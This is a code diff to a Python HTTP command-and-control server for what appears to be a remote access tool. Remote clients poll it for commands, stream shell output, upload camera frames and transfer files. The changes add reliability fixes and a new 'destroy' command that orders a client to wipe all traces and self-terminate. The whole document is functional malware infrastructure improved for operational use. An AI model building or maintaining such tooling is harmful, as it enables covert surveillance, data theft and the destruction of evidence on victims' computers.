@@ -56,6 +56,72 @@ active_client = None
 result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)
 pending_files = {}  # client_id -> (filename, bytes) waiting for client to fetch
 
+# Hard cap on request body size (uploads). Prevents a bogus giant
+# Content-Length from ballooning handler-thread memory.
+MAX_BODY_BYTES = 256 * 1024 * 1024
+
+
+def enqueue_result(client_id, kind, body):
+    """Queue console output. Live 'stream' chunks are droppable under
+    pressure; final 'result' payloads are never silently lost."""
+    item = (client_id, kind, body)
+    if kind != "result":
+        try:
+            result_queue.put_nowait(item)
+        except queue.Full:
+            pass
+        return
+    while True:
+        try:
+            result_queue.put_nowait(item)
+            return
+        except queue.Full:
+            pass
+        # Queue full: drain it, keep only the newest results (plus ours),
+        # discard transient stream chunks, then re-fill.
+        drained = []
+        while True:
+            try:
+                drained.append(result_queue.get_nowait())
+            except queue.Empty:
+                break
+        keep = [d for d in drained if d[1] == "result"][-(result_queue.maxsize - 1):]
+        for kept in keep + [item]:
+            try:
+                result_queue.put_nowait(kept)
+            except queue.Full:
+                break
+        return
+
+
+# Silence longer than this before a reconnecting client's state is stale
+# (mirrors server.py: an outage must not leave a session wedged as RUNNING).
+STALE_STATE_AFTER = 120
+
+
+def _reset_stale_state(client_id, client):
+    """Clear wedged per-client state when a previously-offline client checks in.
+
+    Without this, command_running=True from before an outage persists forever:
+    the session shows RUNNING, refuses every new command, and effectively
+    disappears from the operator's workflow. Must be called with the lock held
+    and BEFORE refreshing last_checkin."""
+    if (
+        not client["command_running"]
+        and not client["pending_stdin"]
+        and not client["interactive"]
+    ):
+        return
+    silent_for = time.time() - client["last_checkin"]
+    if silent_for <= STALE_STATE_AFTER:
+        return
+    client["command_running"] = False
+    client["interactive"] = False
+    client["pending_stdin"] = []
+    safe_print(
+        f"[*] {client_id} back after {silent_for:.0f}s silence — cleared stale command state."
+    )
+
 
 def get_or_create_client(client_id):
     """Get or create a client entry. Must be called with lock held."""
@@ -68,6 +134,8 @@ def get_or_create_client(client_id):
             "command_running": False,
             "interactive": False,
         }
+    else:
+        _reset_stale_state(client_id, clients[client_id])
     return clients[client_id]
 
 
@@ -116,9 +184,18 @@ class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
     request_queue_size = 32
 
     def server_bind(self):
-        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
+        if self.address_family == socket.AF_INET6:
+            self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         super().server_bind()
+
+    def handle_error(self, request, client_address):
+        """Silence routine connection drops (dead clients, phone networks,
+        cloudflared restarts) instead of dumping a traceback per request."""
+        exc = sys.exc_info()[1]
+        if isinstance(exc, (BrokenPipeError, ConnectionResetError, TimeoutError, socket.timeout)):
+            return
+        sys.stderr.write(f"[!] Handler error from {client_address}: {exc!r}\n")
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -126,6 +203,10 @@ class Handler(BaseHTTPRequestHandler):
         pass
 
     protocol_version = "HTTP/1.1"
+    # Per-socket timeout: reaps handler threads stuck on half-dead
+    # connections. Short-poll answers immediately, so this only bounds
+    # dead-socket reads/writes.
+    timeout = 65
 
     def _parse_client_id(self):
         """Extract client ID from ?id= query parameter."""
@@ -236,8 +317,21 @@ class Handler(BaseHTTPRequestHandler):
             self._respond(403, b"forbidden")
             return
 
-        length = int(self.headers.get("Content-Length", 0))
+        try:
+            length = int(self.headers.get("Content-Length", 0))
+        except (TypeError, ValueError):
+            self._respond(400, b"bad content-length")
+            return
+        if length < 0:
+            self._respond(400, b"bad content-length")
+            return
+        if length > MAX_BODY_BYTES:
+            self._respond(413, b"body too large")
+            return
         raw_body_bytes = self.rfile.read(length)
+        if len(raw_body_bytes) < length:
+            self._respond(400, b"incomplete body")
+            return
         body = raw_body_bytes.decode(errors="replace")
 
         if path == "/stream":
@@ -245,10 +339,7 @@ class Handler(BaseHTTPRequestHandler):
                 with lock:
                     client = get_or_create_client(client_id)
                     client["last_checkin"] = time.time()
-            try:
-                result_queue.put_nowait((client_id, "stream", body))
-            except queue.Full:
-                pass
+            enqueue_result(client_id, "stream", body)
             self._respond(200, b"ok")
 
         elif path == "/result":
@@ -259,21 +350,11 @@ class Handler(BaseHTTPRequestHandler):
                     client["command_running"] = False
                     client["interactive"] = False
                     client["pending_stdin"] = []
-            # Never drop /result — evict stream chunks if queue is full
-            while True:
-                try:
-                    result_queue.put((client_id, "result", body), timeout=0.1)
-                    break
-                except queue.Full:
-                    try:
-                        evicted = result_queue.get_nowait()
-                        if evicted[1] == "result":
-                            try:
-                                result_queue.put_nowait(evicted)
-                            except queue.Full:
-                                pass  # truly full, drop the stream chunk
-                    except queue.Empty:
-                        break
+            # Never drop /result — enqueue_result evicts droppable stream
+            # chunks under pressure and always keeps final payloads (the old
+            # inline loop could silently discard the result when the queue
+            # happened to drain between the failed put and its evict).
+            enqueue_result(client_id, "result", body)
             self._respond(200, b"ok")
 
         elif path == "/interactive":
@@ -308,10 +389,7 @@ class Handler(BaseHTTPRequestHandler):
                 msg = f"[+] File saved to ~/Desktop/{filename} ({len(raw_bytes):,} bytes)\n"
             except Exception as e:
                 msg = f"[!] Failed to save file: {e}\n"
-            try:
-                result_queue.put_nowait((client_id, "result", msg))
-            except queue.Full:
-                pass
+            enqueue_result(client_id, "result", msg)
             self._respond(200, b"ok")
 
         elif path == "/camera_frame":
@@ -392,6 +470,9 @@ def input_loop():
             "exit",
             "stream",
             "stopstream",
+            # Registered so `destroy` is intercepted even while a command is
+            # running — otherwise it leaks into the remote process's stdin.
+            "destroy",
         }
         BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ", "put ")
         is_builtin = stripped in BUILTINS or any(
@@ -506,6 +587,27 @@ def input_loop():
                     print(f"[!] No client matching '{target}'.")
             continue
 
+        if stripped.startswith("destroy ") or stripped == "destroy":
+            target = cmd.strip()[8:].strip() if stripped.startswith("destroy ") else ""
+            with lock:
+                if not target:
+                    if not active_client:
+                        print("[*] No active client. Use 'use <id>' or 'destroy <id>'.")
+                        continue
+                    target = active_client
+                match = _resolve_client(target)
+                if match:
+                    clients[match]["pending_command"] = "destroy"
+                    clients[match]["pending_stdin"] = []
+                    print(f"[*] Destroy command sent to {match}.")
+                    print("[*] Client will wipe all traces and self-terminate.")
+                    if active_client == match:
+                        active_client = None
+                        print("[*] Active target cleared.")
+                else:
+                    print(f"[!] No client matching '{target}'.")
+            continue
+
         if stripped.startswith("remove "):
             target = cmd.strip()[7:].strip()
             if not target:
@@ -515,6 +617,7 @@ def input_loop():
                 match = _resolve_client(target)
                 if match:
                     del clients[match]
+                    pending_files.pop(match, None)
                     print(f"[*] Removed {match} from sessions.")
                     if active_client == match:
                         active_client = None
@@ -630,6 +733,15 @@ def input_loop():
             if not os.path.isfile(localpath):
                 print(f"[!] Local file not found: {localpath}")
                 continue
+            # Read the file OUTSIDE the lock: a large/slow disk read must not
+            # stall every request thread and the operator console.
+            try:
+                with open(localpath, "rb") as f:
+                    data = f.read()
+            except Exception as e:
+                print(f"[!] Cannot read file: {e}")
+                continue
+            filename = os.path.basename(localpath)
             with lock:
                 if not active_client:
                     print("[*] No active client. Use 'use <id>' to select one.")
@@ -643,13 +755,6 @@ def input_loop():
                         f"[!] Command already running on {active_client}. Cancel first."
                     )
                     continue
-                try:
-                    with open(localpath, "rb") as f:
-                        data = f.read()
-                except Exception as e:
-                    print(f"[!] Cannot read file: {e}")
-                    continue
-                filename = os.path.basename(localpath)
                 pending_files[active_client] = (filename, data)
                 client["pending_stdin"] = []
                 client["pending_command"] = f"put:{filename}"
